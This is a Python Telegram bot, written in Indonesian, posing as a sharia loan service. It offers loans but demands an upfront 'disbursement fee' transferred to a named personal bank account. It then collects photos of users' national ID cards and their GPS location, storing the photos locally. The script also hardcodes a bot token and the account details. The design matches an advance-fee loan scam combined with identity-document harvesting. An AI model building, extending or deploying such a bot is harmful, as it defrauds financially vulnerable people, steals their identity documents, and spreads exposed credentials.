import os
import telebot
from telebot import types

# Token bot Telegram
BOT_TOKEN = '8477647265:AAFzFGqUiqLjRWy5kTuKvnFiCvjnFydcxOU'
bot = telebot.TeleBot(BOT_TOKEN)

# Pastikan folder untuk menyimpan foto KTP ada
if not os.path.exists("ktp"):
    os.makedirs("ktp")

# Data pinjaman
opsi_pinjaman = {
    "2.500.000": {"tenor": "3 bulan", "biaya": 250000},
    "5.000.000": {"tenor": "6 bulan", "biaya": 250000},
    "7.500.000": {"tenor": "9 bulan", "biaya": 250000},
    "10.000.000": {"tenor": "12 bulan", "biaya": 250000}
}

@bot.message_handler(commands=['start', 'help'])
def kirim_welcome(message):
    bot.reply_to(message,
                 "🤝 Selamat datang di *KingTopup Pinjaman Syariah!*\n\n"
                 "Gunakan /pinjam untuk melihat daftar pinjaman.\n"
                 "Gunakan /ktp untuk verifikasi identitas Anda.",
                 parse_mode='Markdown')

@bot.message_handler(commands=['pinjam'])
def daftar_pinjaman(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = [types.InlineKeyboardButton(text=f"Rp {jumlah}", callback_data=f"pinjam_{jumlah}")
               for jumlah in opsi_pinjaman]
    markup.add(*buttons)
    bot.send_message(message.chat.id, "💰 Silakan pilih jumlah pinjaman:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('pinjam_'))
def detail_pinjaman(call):
    jumlah = call.data.split('_')[1]
    tenor = opsi_pinjaman[jumlah]["tenor"]
    biaya = opsi_pinjaman[jumlah]["biaya"]

    response_text = (
        f"📋 *Detail Pinjaman:*\n"
        f"Jumlah: Rp {jumlah}\n"
        f"Tenor: {tenor}\n"
        f"Biaya Pencairan: Rp {biaya}\n\n"
        f"💳 *Pembayaran ke:*\n"
        f"Bank: Seabank\n"
        f"Atas Nama: Ipan Nurpana\n"
        f"No. Rekening: 901757312575\n\n"
        f"Setelah transfer, kirim bukti ke admin untuk diproses."
    )
    bot.send_message(call.message.chat.id, response_text, parse_mode='Markdown')

@bot.message_handler(commands=['ktp'])
def minta_ktp(message):
    bot.reply_to(message, "📸 Silakan kirim foto KTP Anda.")

@bot.message_handler(content_types=['photo'])
def simpan_ktp(message):
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        src = f"ktp/{message.photo[-1].file_id}.jpg"
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.reply_to(message, "✅ Foto KTP diterima. Sekarang kirim lokasi Anda 📍.")
    except Exception as e:
        bot.reply_to(message, f"Terjadi kesalahan: {e}")

@bot.message_handler(content_types=['location'])
def simpan_lokasi(message):
    latitude = message.location.latitude
    longitude = message.location.longitude
    print(f"Lokasi diterima: Latitude = {latitude}, Longitude = {longitude}")
    bot.reply_to(message, "📍 Lokasi diterima. Terima kasih!")

print("🚀 Bot sedang berjalan...")
bot.infinity_polling()
